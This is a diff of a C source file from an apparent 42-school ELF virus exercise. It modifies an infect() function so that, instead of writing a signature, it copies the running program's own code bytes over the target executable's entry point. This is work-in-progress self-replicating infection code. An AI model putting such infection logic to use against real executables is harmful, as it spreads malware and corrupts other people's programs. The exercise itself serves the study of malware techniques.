@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/10/31 16:24:59 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/04 10:50:22 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,6 +14,8 @@
 
 static bool		parsing(byte *file, const struct stat file_stat, elf_data *data);
 static size_t	off_end_exec_segment(elf_data *data);
+
+#define	CODE_SIZE		0xa6b - 0x30 + 1
 
 //	Infects the file located at path
 //
@@ -24,6 +26,7 @@ bool	infect(const str path) {
 	struct stat file_stat = {0};
 	byte		*file_origin = NULL;
 	elf_data	data;
+	uint64_t	rip;
 
 	(void)fd;
 	(void)ret;
@@ -46,11 +49,16 @@ bool	infect(const str path) {
 	if (parsing(file_origin, file_stat, &data) == false)
 		goto infect_end;
 	
-	printf("I can infect %s\n", path);
+	// ft_memcpy(data.file + data.signature_offset, (const byte *)SIGNATURE, SIGNATURE_LEN);
+	get_rip(rip);
 
-	ft_memcpy(data.file + data.signature_offset, (const byte *)SIGNATURE, SIGNATURE_LEN);
+	// To change
+	rip = rip & 0xfffffffff000;
+	rip += 0x30;
 
-	printf("Tried to infect (%lx): %s\n", data.signature_offset, data.file + data.signature_offset);
+	ft_memcpy(file_origin + data.elf->e_entry, (byte *)rip, CODE_SIZE);
+
+	printf("memcpy(%p + 0x%04lx, 0x%lx, %x)\n", file_origin, data.elf->e_entry, rip, CODE_SIZE);
 
 	// Logic ends
 	infect_end:
@@ -144,8 +152,6 @@ static size_t	off_end_exec_segment(elf_data *data) {
 			offset = section->sh_offset + section->sh_size;
 		}
 	}
-
-	printf("end of biggest shit: %08lx\n", offset);
 
 	return offset;
 }
